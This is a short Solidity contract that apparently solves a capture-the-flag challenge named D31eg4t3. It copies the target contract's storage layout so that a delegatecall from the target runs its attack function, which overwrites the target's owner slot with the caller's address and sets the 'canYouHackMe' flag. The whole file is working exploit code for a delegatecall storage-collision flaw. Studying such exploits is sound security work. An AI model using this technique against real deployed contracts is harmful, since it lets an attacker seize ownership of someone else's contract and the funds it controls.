// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./D31eg4t3.sol";

contract Attack {
    // the order of the vars have to be same in order to execute a delegate call
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;
    
    D31eg4t3 public target;

    constructor(address _address) {
        target = D31eg4t3(_address);
    }

    function attack(address _attacker) external {
        owner = _attacker;
        canYouHackMe[_attacker] = true;
    }

    function startAttack() external {
        bytes memory val = abi.encodeWithSignature("attack(address)", msg.sender);

        target.hackMe(val);
    }
}

